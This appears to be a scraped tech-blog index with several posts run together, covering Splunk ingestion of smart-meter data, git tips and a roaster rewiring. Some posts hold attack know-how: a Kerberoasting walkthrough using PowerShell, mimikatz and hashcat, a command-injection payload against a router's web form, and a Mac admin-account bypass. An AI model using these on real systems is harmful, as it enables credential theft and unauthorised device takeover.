ip\u0026gt;\u0026#34; def splunkHec(host, token, logdata): logger = log.getLogger(\u0026#39;SplunkHecHandlerExample\u0026#39;) logger.setLevel(log.DEBUG) stream_handler = log.StreamHandler() stream_handler.level = log.DEBUG logger.addHandler(stream_handler) splunk_handler = SplunkHecHandler(host, token, index=\u0026#34;default\u0026#34;, port=8088, proto=\u0026#39;http\u0026#39;, ssl_verify=False, source=\u0026#34;power\u0026#34;, sourcetype=\u0026#39;_json \u0026#39;) logger.addHandler(splunk_handler) payload = {} payload.update({\u0026#34;index\u0026#34;:\u0026#34;default\u0026#34;}) payload.update({\u0026#34;sourcetype\u0026#34;:\u0026#34;_json\u0026#34;}) payload.update({\u0026#34;source\u0026#34;:\u0026#34;power\u0026#34;}) payload.update({\u0026#34;host\u0026#34;:\u0026#34;gate\u0026#34;}) payload.update({\u0026#34;event\u0026#34;:logdata}) #print payload logger.debug(payload) def main(): parser = argparse.ArgumentParser(prog=\u0026#34;raven\u0026#34;, description=\u0026#34;Interrogate the RAVEn USB IHD\u0026#34;) parser.add_argument(\u0026#39;--port\u0026#39;, \u0026#39;-p\u0026#39;, help=\u0026#39;Serial port of the USB stick [/dev/ttyUSB0]\u0026#39;, default=\u0026#34;/dev/ttyUSB0\u0026#34;) parser.add_argument(\u0026#39;--limit\u0026#39;, \u0026#39;-l\u0026#39;, help=\u0026#39;Count of events to consume before stopping [1000]\u0026#39;, default=1000) parser.add_argument(\u0026#39;--version\u0026#39;, \u0026#39;-V\u0026#39;, action=\u0026#39;version\u0026#39;, version=\u0026#39;%(prog)s {version}\u0026#39;.format(version=_version.__version__)) args = parser.parse_args() raven_usb = raven.Raven(\u0026#34;/dev/ttyUSB0\u0026#34;) print(raven_usb.get_connection_status()) print(raven_usb.get_summation_delivered()) # just wait for a while, because the scheduler inside the stick delivers # instantaneous demand automatically limit = int(vars(args)[\u0026#39;limit\u0026#39;]) or -1 while limit \u0026lt; 0 or limit \u0026gt; 0: temp=raven_usb.long_poll_result() #print(temp) splunkHec(splunkhost, token, temp) if limit \u0026gt; 0: limit -= 1 if __name__ == \u0026#34;__main__\u0026#34;: main() ``` There are two requirements here pyRaven and Splunk_hec_handler, those can be found here: https://github.com/vavarachen/splunk_hec_handler https://github.com/nonspecialist/pyraven The splunk hec handler can also be found in pypi, however at the time of writing the version on pypi was broken and would not pip install, go after the source instead, then do the python setup.py install Great we have the requirements and the script. The script is pretty straight forward it connects to the serial port, it will listen to the serial firehose and parse when the data flows across. This is where the usb device is just terrible it has options to query the api but then there is a 4 second lag, during which time the same data will spit out automatically and then again from the query. It is really easier to sit there and listen to the firehose. Regardless the pyraven library does all the work and we are plugging in to it to grab the json object and pass it to a splunkhec function. The splunkhec function receives the data and appends the needed wrapper and posts the event. The posting of the event is then handled by the splunkhec library because why reinvent the wheel and deal with rest posts when we can use a library to do it. What this gives us is a nice json object being loaded into splunk. After we examine the data we can see that a simple splunk search, will give us the graph below. host=gate | timechart avg(event.raw_demand) as Load span=1m https://gist.githubusercontent.com/ridingintraffic/df6bf2f9b3a6e5c036402e69da8321bf/raw/4548814ecc46943b91fdfb83f8afec210938ca32/gistfile1.txt { event:\t{ demand:\t0.882 divisor:\t1000 multiplier:\t1 raw_demand:\t882 timestamp:\t2018-10-04T23:30:49Z } host:\tgate index:\tdefault log_level:\tDEBUG source:\tpower sourcetype:\t_json }\n#ugly raw text {\u0026ldquo;event\u0026rdquo;: {\u0026ldquo;demand\u0026rdquo;: 0.882, \u0026ldquo;divisor\u0026rdquo;: 1000, \u0026ldquo;multiplier\u0026rdquo;: 1, \u0026ldquo;raw_demand\u0026rdquo;: 882, \u0026ldquo;timestamp\u0026rdquo;: \u0026ldquo;2018-10-04T23:30:49Z\u0026rdquo;}, \u0026ldquo;host\u0026rdquo;: \u0026ldquo;gate\u0026rdquo;, \u0026ldquo;index\u0026rdquo;: \u0026ldquo;default\u0026rdquo;, \u0026ldquo;log_level\u0026rdquo;: \u0026ldquo;DEBUG\u0026rdquo;, \u0026ldquo;source\u0026rdquo;: \u0026ldquo;power\u0026rdquo;, \u0026ldquo;sourcetype\u0026rdquo;: \u0026ldquo;_json\u0026rdquo;}\nThe service: In order for the pi to run this script automagically a service template is used and then installed. The service is assuming the the emu.py from above is going to be store in /home/pi/ folder. https://gist.githubusercontent.com/ridingintraffic/b860042351c2a45c84046442f5d5474a/raw/044e1c730df5a748b204223651b64de6a1702399/emu.service [Unit] Description=emu power Wants=network-online.target After=network-online.target AssertFileIsExecutable=/home/pi/emu.py\n[Service] WorkingDirectory=/home/pi\nUser=pi Group=pi\nPermissionsStartOnly=true\nExecStart=/usr/bin/python /home/pi/emu.py\nLet systemd restart this service only if it has ended with the clean exit code or signal. Restart=on-success\nStandardOutput=journal StandardError=inherit\nSpecifies the maximum file descriptor number that can be opened by this process LimitNOFILE=65536\nDisable timeout logic and wait until process is stopped TimeoutStopSec=0\nSIGTERM signal is used to stop Minio KillSignal=SIGTERM\nSendSIGKILL=no\nSuccessExitStatus=0\n[Install] WantedBy=multi-user.target\nBuilt for ${project.name}-${project.version} (${project.name}) Alright the next step is to make sure the python script is executable and then install the service template and get it running. That can all be done with the snippet below. https://gist.githubusercontent.com/ridingintraffic/7224fe95ab50462dc21f547ca8349d67/raw/08f6c00f0be554b38052053488e518e15e79887c/snippet ```chmod +x /home/pi/emu.py # setting the python script to executable cp emu.service /etc/systemd/system # copy the service template sudo systemctl daemon-reload # systemd refresh the system folder for templates sudo systemctl enable emu.service # install and enable the service sudo systemctl start emu.service # start it up! sudo systemctl status emu # did it work? Thats all there is to it, the service is running the python script and outputting a whole bunch of nice data to play with. Once the data is acquired then the possibilities are endless for monitoring and reporting out of splunk for high usage or anomalous usage.\nBONUS: (JQ is required for parsing) In order to get the data in to splunk a HTTP collector token is needed. Use curl to generate a token: https://gist.githubusercontent.com/ridingintraffic/ba53e9a7690162281cd3add568aaffd6/raw/fe63ce8ff0a852cf90ab1e4be1624cc72da6f562/curl%20http%20collector\n$ curl -u admin:changme https://\u0026lt;yoursplunkIP\u0026gt;:8089/servicesNS/nobody/system/data/inputs/http/?output_mode=json \\ -d name=test_thing2 \\ -d sourcetype=testing \\ -d index=default \\ --insecure -X POST | jq .entry[0].content.token -r $ 38985917-f6c1-xxxx-xxxx-2c4e8c77798d ","permalink":"https://ridingintraffic.github.io/posts/2018-10-05-splunk-power-mains/","summary":"splunking home power What happens when you take Splunk, a wireless smart meter and an api interface? Splunking your entire home’s power main, without touching a single power wire! This allows a whole house view of all the power being drawn in real time. The only requirements are raspberry pi on a network, a splunk instance somewhere and a usb adapter plugged into the PI.\nHold on, hold on, whats a smart meter?","title":"2018-10-05 splunk-power-mains"},{"content":"splunk things windows event codes widnwos event codes are impossible to remember luckily there is a lookup out there https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx Lookup from github windows event code stuff, there is also a ton of other windwos docs in there\u0026hellip; https://github.com/MicrosoftDocs/windowsserverdocs/blob/master/WindowsServerDocs/identity/ad-ds/plan/Appendix-L--Events-to-Monitor.md\nsplunk and docker https://github.com/splunk/docker-splunk https://github.com/splunk\nsplunk and git https://github.com/Kintyre/ksconf http://www.kintyre.co/uploads/1/0/7/2/107288911/managing_splunk_deployment_with_git_-_philly_splunk_meetup_-_june_2018.pdf\n","permalink":"https://ridingintraffic.github.io/posts/2018-10-03-splunk-things/","summary":"splunk things windows event codes widnwos event codes are impossible to remember luckily there is a lookup out there https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx Lookup from github windows event code stuff, there is also a ton of other windwos docs in there\u0026hellip; https://github.com/MicrosoftDocs/windowsserverdocs/blob/master/WindowsServerDocs/identity/ad-ds/plan/Appendix-L--Events-to-Monitor.md\nsplunk and docker https://github.com/splunk/docker-splunk https://github.com/splunk\nsplunk and git https://github.com/Kintyre/ksconf http://www.kintyre.co/uploads/1/0/7/2/107288911/managing_splunk_deployment_with_git_-_philly_splunk_meetup_-_june_2018.pdf","title":"2018_10_03_splunk-things"},{"content":"wifi on mac Sometimes you want to know what wifi network you are on from the terminal or in bash for some reason. this can be done with airport and then a little bit of awk\nloc=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk \u0026#39;/ SSID/ {print substr($0, index($0, $2))}\u0026#39;) echo $loc docker env variables There are these things called build arguments in docker.\nSometimes you will want to pass arguments based on your environment. An example would be if work uses a proxy and hoe doesnt have that proxy.\nloc=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk \u0026#39;/ SSID/ {print substr($0, index($0, $2))}\u0026#39;) if [ \u0026#34;$loc\u0026#34; = \u0026#34;myhomenetwork\u0026#34; ] then location=\u0026#34;home\u0026#34; docker build --build-arg HTTP_PROXY=\u0026#34;\u0026#34; . -t jarvis else location=\u0026#34;work\u0026#34; docker build --build-arg HTTP_PROXY=\u0026#34;http://WORKPROXY:8080\u0026#34; . -t jarvis fi ","permalink":"https://ridingintraffic.github.io/posts/2018-09-27-wifi-mac-docker-build-args/","summary":"wifi on mac Sometimes you want to know what wifi network you are on from the terminal or in bash for some reason. this can be done with airport and then a little bit of awk\nloc=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk \u0026#39;/ SSID/ {print substr($0, index($0, $2))}\u0026#39;) echo $loc docker env variables There are these things called build arguments in docker.\nSometimes you will want to pass arguments based on your environment.","title":"2018_09_27_wifi_things_docker_things"},{"content":"removing git history sometimes you jsut want to wipe everything from a git repo but you want to hold on to the files.\nWe can do this by following this pattern:\n\u0026ndash; Remove history rm -rf .git\n\u0026ndash; recreate the repos from the current content only git init git add . git commit -m \u0026ldquo;Initial commit\u0026rdquo;\n\u0026ndash; push to the github remote repos ensuring you overwrite history git remote add origin git@github.com:/.git git push -u \u0026ndash;force origin master\ncyber chef https://gchq.github.io/CyberChef/ cyber chef tool form the ctf for doing a lot of data manipulations and whatnot\nroot-me sometimes there are good challenge to stretch your brain https://www.root-me.org/?lang=en information on all of it from root-me http://repository.root-me.org/\n","permalink":"https://ridingintraffic.github.io/posts/2018-09-18-git-wipe/","summary":"removing git history sometimes you jsut want to wipe everything from a git repo but you want to hold on to the files.\nWe can do this by following this pattern:\n\u0026ndash; Remove history rm -rf .git\n\u0026ndash; recreate the repos from the current content only git init git add . git commit -m \u0026ldquo;Initial commit\u0026rdquo;\n\u0026ndash; push to the github remote repos ensuring you overwrite history git remote add origin git@github.","title":"2018_09_18_wiping-git"},{"content":"Synology time machine \u0026ldquo;How_to_back_up_files_from_Mac_to_Synology_NAS_with_Time_Machine.\nThis will let you p[lug in a usb drive to a synolgoy nas and then from there configure an AFP share that mac\u0026rsquo;s time machine software will find and then allow network backups. It is still on site so it isn\u0026rsquo;t totally secure and reliable. But it is a pretty good use of a 2tb drive and a NAS. The initial backup is kind of brutal but then anything after that should be a bit better and faster. YEY for convenience\n","permalink":"https://ridingintraffic.github.io/posts/2018-08-28-time-machine-nas/","summary":"Synology time machine \u0026ldquo;How_to_back_up_files_from_Mac_to_Synology_NAS_with_Time_Machine.\nThis will let you p[lug in a usb drive to a synolgoy nas and then from there configure an AFP share that mac\u0026rsquo;s time machine software will find and then allow network backups. It is still on site so it isn\u0026rsquo;t totally secure and reliable. But it is a pretty good use of a 2tb drive and a NAS. The initial backup is kind of brutal but then anything after that should be a bit better and faster.","title":"2018-08-28_Synology_Time_Machine"},{"content":"Kerberoasting! Lets talk about some old security here. Kerberos! This is a couple years old but sadly still works. Kerberos is the authentication system for windows and ad networks. There is an exploit that allows us to get back a poorly encrypted hash of valuable logins all directly from the domain controller, this is done once you have an authenticated user, so it isn\u0026rsquo;t the main way in but once you have a foothold you can pivot to a more useful account. Lets have a brief breakdown of how kerberos works, borrowed from https://adsecurity.org/?p=3458\nUser logs on with username \u0026amp; password. 1a. Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC as an authenticator in the authentication ticket (TGT) request (AS-REQ). 1b. The Domain Controller (KDC) checks user information (logon restrictions, group membership, etc) \u0026amp; creates Ticket-Granting Ticket (TGT). 2. The TGT is encrypted, signed, \u0026amp; delivered to the user (AS-REP). Only the Kerberos service (KRBTGT) in the domain can open and read TGT data. 3. The User presents the TGT to the DC when requesting a Ticket Granting Service (TGS) ticket (TGS-REQ). The DC opens the TGT \u0026amp; validates PAC checksum - If the DC can open the ticket \u0026amp; the checksum check out, TGT = valid. The data in the TGT is effectively copied to create the TGS ticket. 4. The TGS is encrypted using the target service accounts\u0026rsquo; NTLM password hash and sent to the user (TGS-REP). 5.The user connects to the server hosting the service on the appropriate port \u0026amp; presents the TGS (AP-REQ). The service opens the TGS ticket using its NTLM password hash. 6. If mutual authentication is required by the client (think MS15–011: the Group Policy patch from February that added UNC hardening). Unless PAC validation is required (rare), the service accepts all data in the TGS ticket with no communication to the DC. Alright so lets just dive right in to the nitty gritty here. We are going to do this on a windows box with powershell and the active directory module. The return will look something like \u0026ldquo;MSSQLSvc/adsmsDB01.adsecurity.org:1433\u0026rdquo;, then \u0026ldquo;MSSQLSvc\u0026rdquo; is the SPN type. The SPN is really the important part of the initial scan because we will want to find specific types of SPNs. Such as: AGPMServer: Often has full control rights to all GPOs. MSSQL/MSSQLSvc: Admin rights to SQL server(s) which often has interesting data. FIMService: Often has admin rights to multiple AD forests. STS: VMWare SSO service which could provide backdoor VMWare access. To do the actual querying we can use the Get-ADUser cmdlet:\nget-aduser -filter {AdminCount -eq 1} -prop * | select name,created,passwordlastset,lastlogondate We can also use PowerView\u0026rsquo;s Get-NetUser cmdlet:\nGet-NetUser -AdminCount | Select name,whencreated,pwdlastset,lastlogon Once we have an SPN then lets get the querying for the vulnerable hash type\n$SPNName = \u0026#39;MSSQLSvc/adsmsDB01.adsecurity.org:1433\u0026#39; Add-Type -AssemblyNAme System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName We can then use \u0026ldquo;$ klist \u0026ldquo;in order to get the listing of the hash and from there we can use mimikatz in order to export.\n$ kerberos::list /export``` Then we just drop that hash into hashcat with a word list and we are good to go. Sadly this vulnerability is over 4 years old, it is still out there. In order to mitigate it the recommendation is ensuring service account passwords are longer than 25 characters (and aren\u0026#39;t easily guessable). Also enabling logging and then dropping that log information into a SIEM where you can look for specific \u0026#34;4769 events\u0026#34; and and Ticket_Encryption_Type= : 0x17. Good luck! links: https://adsecurity.org/?p=2293 : \u0026#34;Cracking Kerberos TGS Tickets Using Kerberoast - Exploiting Kerberos to Compromise the Active Directory Domain\u0026#34; https://adsecurity.org/?p=3466 : \u0026#34;Sneaky Persistence Active Directory Trick #18: Dropping SPNs on Admin Accounts for Later Kerberoasting.\u0026#34; ","permalink":"https://ridingintraffic.github.io/posts/2018-08-28-kerberoasting/","summary":"Kerberoasting! Lets talk about some old security here. Kerberos! This is a couple years old but sadly still works. Kerberos is the authentication system for windows and ad networks. There is an exploit that allows us to get back a poorly encrypted hash of valuable logins all directly from the domain controller, this is done once you have an authenticated user, so it isn\u0026rsquo;t the main way in but once you have a foothold you can pivot to a more useful account.","title":"2018-08-28 kerberoasting"},{"content":"router hacking These instructions are only intended for the purpose of being able to install legally licensed firmware on routers you own. Do not use this guide as instructions for violating any patents or copyright laws\nThere is a router out there known as T-Mobile (AC-1900) which is a rebranded ASUS AC1900/68u. The tmobile router sells for $70 and the asus router sells for $130–$170. Whats the difference between these two? Nothing other than firmwares.\nModding firmwares can be a bit scary and intimidating at first. But after that first brick and then that first time bringing it back from the dead, one can gain confidence. Take your time read through the instructions a few times and don\u0026rsquo;t forget to breathe. Fundamentals: routers usually run a very basic set of software. This is usually booted up the same way every time a router starts. Most cases we are going to interrupt the router boot and drop it into a bootloader or recovery mode. This is running a separate start option that is usually stored on a separate memory chip or a special set of memory addresses. This allows us to modify the system firmware from outside the usual run process. Various routers have different ways of entering this mode, but at the end of the day its all the same. It\u0026rsquo;s separate environment and generally just the absolute barebones the work with. Lets begin, the first pass of the firmware mod. https://www.bayareatechpros.com/ac1900-to-ac68u/ Give this a read and then we can come back here. Pretty striaght forward drop router into recovery mode load an older TM firmware. Then modify the cfe/MTD… . wait whats the mtd and cfe? http://www.linux-mtd.infradead.org/doc/general.html \u0026ldquo;MTD subsystem (stands for Memory Technology Devices) it provides an abstraction layer for raw flash devices. It makes it possible to use the same API when working with different flash types and technologies… provide I/O access to the raw flash. They support a number of ioctl calls for erasing eraseblocks, marking them as bad or checking if an eraseblock is bad, getting information about MTD devices, etc.\u0026rdquo; CFE: common firmware environment. https://en.wikipedia.org/wiki/Common_Firmware_Environment \u0026ldquo;It is intended to be a flexible toolkit of CPU initialization and bootstrap code for use on embedded processors (typically running on MIPS32/64 instruction set CPUs found in Broadcom SoCs). It is roughly analogous to the BIOS\u0026rsquo; \u0026quot; . Next we are modifying the CFE so that the proper mac address range is used instead of the TM version. This allows the vanilla asus firmware to get installed because there are restrictions on the firmware only running on a specific range of mac addresses. The modded firmware is up and running, bam done great. OOPS we upgraded the router and it reverted back to TM locked down firmware. This is often done by accident, such as not paying attention and thinking \u0026ldquo;hey I should upgrade\u0026rdquo;. Nuts, they also disabled telnet and ssh in the firmware itself. Not just hiding it in the UI via hidden and disable tags. Looks like they are starting to try pretty hard to stop us from changing the firmware. Not sure why exactly they are trying so hard to lock us out, but alright. How do we get at a terminal for the router now? Well, there is a network tools page, that is essentially an open terminal. I guess they assume if you are logged in to the router they should allow anything to happen. Another situation where, \u0026ldquo;well if they get past my firewall than my internal network is pwned situation.\u0026rdquo; (sigh) Sadly this is often repeated all throughout the tech industry.\nAfter a bit of searching I came across this google doc, that is going to help explain how we will actually hack our router. https://docs.google.com/document/d/1NsZMONmJ70zMmoAKKQJXbTVKytaPJptWTpqih1TD5n8/edit?usp=sharing I am not going to go through and repeat everything that was laid out there but I will skip to some interesting bits. First we will need to get the needed files onto a usb. once we have them all zipped up we will plug in the usb drive in to the back of the router and leverage the usb support built in. Then using the network tools windows that we talked about earlier we are going to exploit a code flaw of the form. Thus actually hacking our router by closing the network command and then running our commands. If we open the console part of the developer tools on say chrome once we are on the page. we can do something like this. validForm = function(){document.form.SystemCmd.value = \u0026#34;ping\\nmount -t tmpfs tmpfs userRpm\u0026#34;;return true;} Here we had the network tools run the ping command and then just drop to a new line and since we had a web shell we can run a mount command and get that usb mounted. Then there are a few more commands that need to be run which takes us to restarting a service on the router. This is done much the same way we would do it on a linux box. validForm = function(){document.form.SystemCmd.value = \u0026#34;ping\\nservice restart_httpd\u0026#34;;return true;} Again we are using the ping command then then restarting the httpd service that we slightly tweaked to do our bidding. Then once the service is restarted we do a few more mount commands and a find in order to snag a couple more files from the mounted usb. Finally we run the big scary command that should most definitely not be allowed to be run form a webshell but hey they left the ability there so we are going to take advantage of it . ¯_(ツ)_/¯\nvalidForm = function(){document.form.SystemCmd.value = \u0026#34;ping\\nmtd-write2 FW_RT_AC68U_30043763626.trx linux\u0026#34;;return true;} Here we are rewriting the firmware to one that we seeded. oops/awesome! Well then there are a few more cleanup steps involved in finishing up the mod and getting things setup to maintain the firmware. The real interesting thought is that perhaps a router manufacturer should spend less time and effort trying to stop modders from messing with the hardware on site, and a little bit more effort securing the software itself, because if you can do this from the gui, you better believe that there are underlying security vulnerabilities in there that would let worse things happen. It would be a somewhat simple fix of elevated run levels for specific actions and perhaps validating the inputs of the webform/shell to not allow extra commands to flow through… but hey let waste our time where the money is right? Sadly just another router manufacturer that jams out some hardware and leaves a squishy underbelly of software. But hey if no one looks then no one will find the problem right? I hope everyone enjoyed a whirlwind tour of router hacking 101–103, until next time. Same hack time same hack channel. Footnotes: modding tutorial for older firmware tmobile: https://www.bayareatechpros.com/ac1900-to-ac68u/ hardware: https://www.amazon.com/T-Mobile-Wireless-AC1900-Dual-Band-AiProtection-Complete/dp/B01MYTAURW google doc with in-depth breakdown https://docs.google.com/document/d/1NsZMONmJ70zMmoAKKQJXbTVKytaPJptWTpqih1TD5n8/edit?usp=sharing\n","permalink":"https://ridingintraffic.github.io/posts/2018-08-27-router_modding/","summary":"router hacking These instructions are only intended for the purpose of being able to install legally licensed firmware on routers you own. Do not use this guide as instructions for violating any patents or copyright laws\nThere is a router out there known as T-Mobile (AC-1900) which is a rebranded ASUS AC1900/68u. The tmobile router sells for $70 and the asus router sells for $130–$170. Whats the difference between these two?","title":"2018-08-27 router modding"},{"content":"cia hacking The cia had their hacking tools dumped on the web, no way who would have guessed they had these tools, of course they do and they have. schneier wikileaks_relea mkdir whole paths mkdir -p a/b/c makes the WHOLE path woooo!!!\nstruts 0-day who likes 0-days 0-days happen this one looks fun apache-struts-framework z A tool to jump around directories easily in the terminal with this thing called z github repo z ripgrep ripgrep combines the usability of The Silver Searcher with the raw speed of grep. ripgrep\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-09-2017-03-09/","summary":"cia hacking The cia had their hacking tools dumped on the web, no way who would have guessed they had these tools, of course they do and they have. schneier wikileaks_relea mkdir whole paths mkdir -p a/b/c makes the WHOLE path woooo!!!\nstruts 0-day who likes 0-days 0-days happen this one looks fun apache-struts-framework z A tool to jump around directories easily in the terminal with this thing called z github repo z ripgrep ripgrep combines the usability of The Silver Searcher with the raw speed of grep.","title":"2017-03-09 cia, hacking, , struts, ripgrep, z"},{"content":"git Git should know better and totally commit and add files that I was working on last night. I left an uncommited file sitting on a laptop at my house when I went to work today\u0026hellip; Rookie mistake.\nfor ALL the repos\n$ git config --global user.name \u0026#34;John Doe\u0026#34; $ git config --global user.email \u0026#34;john@doe.org\u0026#34; only for oen repo\n$ git config user.name \u0026#34;John Doe\u0026#34; $ git config user.email \u0026#34;john@doe.org\u0026#34; git aliases are cool add to your .gitconfig\n[alias] # Show verbose output about tags, branches or remotes # abbreviations st = status -s ch = checkout co = commit splunk indexing #**************************************** # BATCH (\u0026#34;Upload a file\u0026#34; in Splunk Web): #**************************************** NOTE: Batch should only be used for large archives of historic data. If you want to continuously monitor a directory or index small archives, use monitor (see above). Batch reads in the file and indexes it, and then deletes the file from the Splunk instance. [batch://\u0026lt;path\u0026gt;] * One time, destructive input of files in \u0026lt;path\u0026gt;. * For continuous, non-destructive inputs of files, use monitor instead. lastpass cli this github repo is pretty rad. It is a lastpass cli that does not kick you uot of your main session in your borwser. This helps when concurrent lastpass sessions is needed. lastpass-cli\noctet for file permissions hey I like seeing numbers for file permissions do you?\nstat -c \u0026#34;%a %n\u0026#34; .ssh/ 700 .ssh/ ","permalink":"https://ridingintraffic.github.io/posts/2017-03-06-something-witty/","summary":"git Git should know better and totally commit and add files that I was working on last night. I left an uncommited file sitting on a laptop at my house when I went to work today\u0026hellip; Rookie mistake.\nfor ALL the repos\n$ git config --global user.name \u0026#34;John Doe\u0026#34; $ git config --global user.email \u0026#34;john@doe.org\u0026#34; only for oen repo\n$ git config user.name \u0026#34;John Doe\u0026#34; $ git config user.email \u0026#34;john@doe.org\u0026#34; git aliases are cool add to your .","title":"2017-03-06 git, splunk, lastpass-cli"},{"content":"confluence confluence supports some version of markdown, however it is not super compatabiole with jekyll. There is a quick little ruby script that converts your .md files into a text that confluence can handle. markdown2confluence\nresetting admin passwords on a mac. I was reminded of this loophole topday and though I woudl write it down. how-to-create-a-new-administrator-account\nPROCEDURE 1. BOOT INTO SINGLE-USER MODE Turn on the computer. Upon hearing the startup chime, hold the key combination CMD+S. This boots the computer into single-user mode, which in turn gives you access via the root user. It is important to note, however, that this can be blocked by a firmware password. If that’s the case, head on over to one of our other guides on getting into single-user mode while locked. 2. MOUNT THE HARD DRIVE Once single-user mode boots (it should look like a black screen with white text), we need to mount the hard drive. At the prompt type in: /sbin/mount -uw / 3. REMOVE THE “SETUP HAS BEEN COMPLETED” FILE Now that the drive is mounted, we can edit the file system. We’re going to delete a file that tells your computer that you have completed the initial setup. Type in: rm /var/db/.applesetupdone This command deletes the file “.applesetupdone” in the /var/db/ directory, which the computer checks for on startup to ensure that the computer has already been set up. 4. REBOOT Pretty self explanatory. We need the system to reboot so it can check for the file and then notice it’s missing. Type in: reboot 5. WATCH THE VIDEO Your computer will shut down and reboot. A setup window should pop up asking what language you want your computer to be in, just as if you turned on your computer for the first time after purchase. After you select a language, a welcome video will play. If you brought headphones along, feel free to plug them in during the “Select A Language” screen. Otherwise, enjoy a little music. 6. CONTINUE SETUP Go through the rest of the setup process. Be sure to select “DO NOT TRANSFER MY DATA”. Don’t worry, all of your old files will still be on the computer. At one point during setup you will have to configure your internet connection, this is when you need your wireless password. It’s fine if you don’t have the password, you can enter it later if you need to. 7. SET UP THE ADMINISTRATOR ACCOUNT Near the end of the setup you will be asked to create an administrator account for your computer. Be sure to make the name of the admin account different from the existing one. You can name the account anything that you want, except for the name of the old administrator account. If the new account is given the same name as the old one it will overwrite the old account, causing all the old account’s files to be deleted. 8. FINISH SETUP AND LOG IN Wrap up the setup and the computer should automatically log you into your new administrator account. SOME IMPORTANT NOTES: This administrator account is exactly like any other account. It is not hidden in any way, and it does not have any special privileges. With this account you will be able to change the password on the old administrator account, and access the files of any account stored locally on the computer (unless the old user has enabled FileVault on their account. Again, if you’d prefer to recover the password of any current user on the computer, follow our other guide on cracking Mac passwords. ","permalink":"https://ridingintraffic.github.io/posts/2017-03-07-today/","summary":"confluence confluence supports some version of markdown, however it is not super compatabiole with jekyll. There is a quick little ruby script that converts your .md files into a text that confluence can handle. markdown2confluence\nresetting admin passwords on a mac. I was reminded of this loophole topday and though I woudl write it down. how-to-create-a-new-administrator-account\nPROCEDURE 1. BOOT INTO SINGLE-USER MODE Turn on the computer. Upon hearing the startup chime, hold the key combination CMD+S.","title":"2017-03-07  markdown, confluence, mac admin accounts"},{"content":"roast Info using the kill-a-watt attached to the router for exact wattage measurements on my 1200 watt poppery II. full heat is 1000 watts with the heating coils fully isolated. Also there is a basic high temp thermometer that is simply dropped in the top\nambient air temp is 68 degrees with 25% humidity preheat to 275 which is stable heat at 650 watts fan should be run at 100% but can dial down subtly in order to finely adjust the temps |\u0026mdash;+\u0026mdash;+\u0026mdash;|\nwattage time 650 4 min 800 4 min 1000 til end roasting 3-2-17 |\u0026mdash;+\u0026mdash;+\u0026mdash;|\ntemp time 200 :30 225 1:10 250 1:45 275 3:30 300 5:00 325 7:15 350 8:50 375 9:50 400 11:10 drop 12:30 roaster modding roaster large\nThe modification of the roaster is not that hard but it is important to take your time and go through all of the tutorials. My neighbor gave me some good input about the safety features built in to the roaster and advised that it is not good to bypass the thermal fuse/ thermostat. This was not done because a) it isnt safe and b) I was not having issues with the temps not getting high enough it was more about controlling the low end to slow down the initial phase of the roast process.\nparts list from amazon Honeywell AT140A1000 40Va, 120V Transformer - 60 Hz. TruePower 123 Variable Dial Router Speed Controller for Duct and Inline Fans Leviton 6602-IW Trimatron 600W Incandescent Rotary Dimmer, Single Pole, White/Ivory StarTech.com 3 ft Power Extension Cord - NEMA 5-15R to NEMA 5-15P - 16 AWG Power Extension Cable Cord - 125 Volts at 13 Amps - SJT - 3ft Steel City 52171 1/2\u0026amp;3/4E Pre-Galvanized Steel Square Box with Ground Bump and 1/2-Inch and 3/4-Inch Eccentric Knockouts Arlington LPCG50-1 Low-Profile Strain Relief Cord Connector, 1/2 Inch BNTECHGO 16 Gauge Silicone Wire 10 feet Red - Soft and Flexible High Temperature Resistant Highly Efficient 16 AWG Silicone Wire 252 Strands of copper wire [Arlington Industries NM94 1/2\u0026quot; Plastic Romex Push-In Connector](https://www.amazon.com/gp/product/B003BG2I9Q/ \u0026ldquo;Arlington Industries NM94 1/2\u0026rdquo; Plastic Romex Push-In Connector\u0026quot;) Hubbell Raco 800C 1 Toggle 4-Inch Square Exposed Work Cover I am not going to reinvent the wheel here so I will copy and paste the tutorials below in case their sites ever go offline.\nThis one has a great wiring diagram to seperate the two circuits. completing-hiros-journey-poppery-ii-mod\nI like the photos and the explanation of this one. west-bend-popper-2-rewire-coffee-roasting\nWest Bend Popper 2 Rewire for Coffee Roasting August 27, 2014 by Sam Hampton west-bend-popper-2-rewire-coffee-roasting\nI was inspired to buy the West Bend Poppery 1 when I saw willbldrco’s video on YouTube entitled West Bend Poppery rewire for coffee roasting. What a masterful modification to simply solve the coffee roasting routine by changing one wire to another terminal.\nBy changing the fan wire to the hot terminal, so it would bypass the off-on switch and the fan would run all the time when the popper was plugged into the socket, is sheer genius. This means that the off-on switch, on the popper, can now be used to control the heat; thereby regulating the temperature and prolonging the roasting time of the beans.\nAn even better solution was provided by Jim West in his West Bend Poppery 2 modification effort. He put the fan on a separate DC current circuit using a transformer from Radio Shack. This allowed the heat to be controlled by a router speed control unit from Harbor Freight. He separated the small heating coil and the main heating coil into one circuit and put the fan on the other transformer circuit.\nMy Alternative Solution\nMy alternative solution of keeping the small coil and the fan in one circuit, the small coil acts as a voltage reducer, and by isolating the Main heating coil in another circuit, the need for a transformer is eliminated. The fan and small coil will run when the circuit is plugged into the 120 volt outlet. The main heating coil will be wired into a separate circuit with its own plug-in wire that can be controlled with the Harbor Freight Router Speed Control, which is plugged into a separate 120 volt outlet.\nThe photograph below shows the items needed to make the alternative conversion outlined above. A $1.69 extension cord, after it is cut in half, will provide the new plug-in cord for the main heating coil. The black wire will provide a connection to one end of the main heating oil, and the small black shunt wire will bypass the thermal fuse, so the fan cannot be shut off by overheating. The rubber grommet $ 0.70 will make a neat entry job for the new main heater cord. The two wire connecting nuts will provide the connection to the Main heating coil wires.\nThe Conversion\nThis conversion will work not only on the West Bend Poppery 2, but on most of the Presto hot air poppers with similar wiring. The one cautionary provision in this modification is to make sure the two circuits are completely separate. Some hot air poppers have the small coil connected directly to the main heating coil. If the popper is so wired, then the small coil must be separated from the main heating coil. It should be connected to a point somewhere on the fan circuit so it is in series with the current to supply power to the fan. This should only be attempted by someone who knows what 